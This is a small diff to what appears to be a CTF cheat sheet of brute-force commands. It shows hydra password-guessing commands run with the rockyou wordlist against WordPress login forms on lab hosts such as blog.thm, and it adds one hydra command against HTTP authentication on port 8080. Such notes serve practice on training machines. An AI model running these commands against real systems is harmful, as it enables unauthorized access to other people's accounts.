@@ -7,6 +7,10 @@ hydra -L wpusers -P /usr/share/wordlists/rockyou.txt colddboxeasy -V http-form-p
 hydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.103.199 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
 ```
 
+Simple hydra webform
+```bash
+hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 $IP http-get
+```
 
 Generic php login
 ```bash
